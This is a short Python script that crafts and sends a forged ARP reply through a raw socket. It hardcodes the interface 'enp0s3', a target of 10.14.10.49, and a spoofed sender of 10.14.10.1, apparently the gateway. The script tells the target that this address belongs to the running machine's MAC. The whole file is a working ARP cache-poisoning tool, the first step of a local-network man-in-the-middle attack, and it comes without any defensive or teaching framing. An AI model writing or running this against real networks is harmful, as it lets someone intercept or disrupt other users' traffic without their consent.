from struct import *
import subprocess
import socket
import re


def arp_reply(target_ip, sender_ip, sender_mac = 0):
	s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
	s.bind(('enp0s3', socket.SOCK_RAW))

	#Gets the mac address for this computer
	this_mac = s.getsockname()[4]

	#Finds sender_mac
	if sender_mac == 0:
		sender_mac = this_mac
	else:
		sender_mac = pack('!6B', *[int(x, 16) for x in sender_mac.split(':')])

	#ARPs for the targets mac address
	target_mac = subprocess.check_output(['arping','-f',target_ip])
	target_mac = re.search('([0-9A-F]{2}[:]){5}([0-9A-F]{2})', str(target_mac)).group(0)
	target_mac = pack('6B', *[int(x, 16) for x in target_mac.split(':')])

	#Packs target and sender ip's
	target_ip = pack('!4B', *[int(x) for x in target_ip.split('.')])
	sender_ip = pack('!4B', *[int(x) for x in sender_ip.split('.')])

	#Creates the ethernet frame
	arp_packet = [
		#Ethernet Header
		target_mac,#Destination mac address
		this_mac,#sender_mac,#Source mac address
		pack('>H', 0x0806),#Protocol type (ARP = 0x0806)

		#ARP Header
		pack('>H', 0x0001),#Hardware type (Ethernet(10 Mb) = 1)
		pack('>H', 0x0800),#Protocol type (IP = 0x0800)
		pack('>B', 0x06),#Mac address length
		pack('>B', 0x04),#Ip address length
		pack('>H', 0x0002),#Opcode (ARP reply = 2)
		sender_mac,#Sender mac address
		sender_ip,#Sender ip address
		target_mac,#Target mac address
		target_ip#Target ip address
	]

	#Sends the arp reply
	s.send(b''.join(arp_packet))
	s.close()

arp_reply('10.14.10.49', '10.14.10.1')

